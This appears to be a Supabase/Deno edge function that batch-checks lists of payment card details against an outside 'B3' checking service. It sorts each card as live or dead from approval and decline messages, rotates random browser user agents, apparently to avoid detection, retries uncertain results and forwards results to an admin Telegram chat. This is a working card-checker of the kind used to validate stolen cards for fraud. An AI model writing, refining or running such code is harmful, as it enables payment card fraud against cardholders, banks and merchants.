import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Determine status from API response - B3 API specific logic
const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const message = (data?.message as string)?.toLowerCase() || '';
  const status = (data?.status as string)?.toUpperCase() || '';
  const result = (data?.result as string)?.toLowerCase() || '';
  
  // LIVE responses - B3 API patterns
  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE' || status === 'CHARGED') {
    return "live";
  }
  if (result === 'approved' || result === 'success' || result === 'live') {
    return "live";
  }
  if (message.includes("approved") || message.includes("success") || message.includes("authorized")) {
    return "live";
  }
  if (message.includes("card added successfully") || message.includes("payment method added")) {
    return "live";
  }
  
  // DEAD responses
  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED' || status === 'ERROR') {
    return "dead";
  }
  if (result === 'declined' || result === 'dead' || result === 'failed') {
    return "dead";
  }
  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
    return "dead";
  }
  if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
    return "dead";
  }
  if (message.includes("not authorized") || message.includes("processor declined")) {
    return "dead";
  }
  
  // Everything else is UNKNOWN
  return "unknown";
};

// Send debug to admin via Telegram
const sendAdminDebug = async (cc: string, status: string, rawResponse: string) => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('[B3-BATCH] No Telegram token - skipping admin debug');
    return;
  }
  
  try {
    // Mask card for display
    const parts = cc.split('|');
    const maskedCard = parts[0] ? 
      `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
      'Invalid format';
    
    // Truncate raw response if too long
    const truncatedRaw = rawResponse.length > 3000 ? 
      rawResponse.substring(0, 3000) + '\n... [truncated]' : 
      rawResponse;
    
    const statusEmoji = status === 'live' ? '✅' : status === 'dead' ? '❌' : '❓';
    
    const message = `${statusEmoji} <b>Yunchi Auth 3 Debug</b>\n\n` +
      `<b>Card:</b> <code>${maskedCard}</code>\n` +
      `<b>Status:</b> ${status.toUpperCase()}\n\n` +
      `<b>Raw API Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
  } catch (error) {
    console.error('[B3-BATCH] Failed to send admin debug:', error);
  }
};

// Perform single card check with retry logic
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 2; // Reduced retries for batch processing speed
  const apiUrl = `https://b3.up.railway.app/${cc}`;
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
      }
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      const lowerText = rawText.toLowerCase();
      if (lowerText.includes('approved') || lowerText.includes('success') || lowerText.includes('live')) {
        data = { raw: rawText, status: "APPROVED", message: rawText };
      } else if (lowerText.includes('declined') || lowerText.includes('dead') || lowerText.includes('failed')) {
        data = { raw: rawText, status: "DECLINED", message: rawText };
      } else {
        data = { raw: rawText, status: "UNKNOWN", message: rawText };
      }
    }

    const computedStatus = getStatusFromResponse(data);
    const apiMessage = data.message || data.msg || 'No response message';
    
    // Send admin debug with raw response (fire-and-forget)
    sendAdminDebug(cc, computedStatus, rawText).catch(() => {});
    
    // Retry on UNKNOWN
    if (computedStatus === "unknown" && attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 500 * attempt));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }

    return {
      cc,
      computedStatus,
      apiStatus: data.status || data.result || 'UNKNOWN',
      apiMessage
    };
  } catch (error) {
    if (attempt < maxRetries) {
      await new Promise(resolve => setTimeout(resolve, 500 * attempt));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }
    
    const errorMsg = error instanceof Error ? error.message : "Unknown fetch error";
    
    // Send admin debug for errors too
    sendAdminDebug(cc, "error", errorMsg).catch(() => {});
    
    return { 
      cc,
      apiStatus: "ERROR",
      apiMessage: errorMsg,
      computedStatus: "unknown"
    };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cards } = await req.json();
    
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return new Response(
        JSON.stringify({ error: 'Cards array is required', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Limit batch size to 10 cards per request
    const batchCards = cards.slice(0, 10);
    
    console.log(`[B3-BATCH] Processing ${batchCards.length} cards for user:`, user.id);

    // Process all cards in parallel using Promise.all
    const results = await Promise.all(
      batchCards.map(async (cc: string) => {
        const userAgent = getRandomUserAgent();
        return performCheck(cc, userAgent);
      })
    );

    console.log(`[B3-BATCH] Completed ${results.length} cards`);

    return new Response(
      JSON.stringify({ results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[B3-BATCH] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, results: [] }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
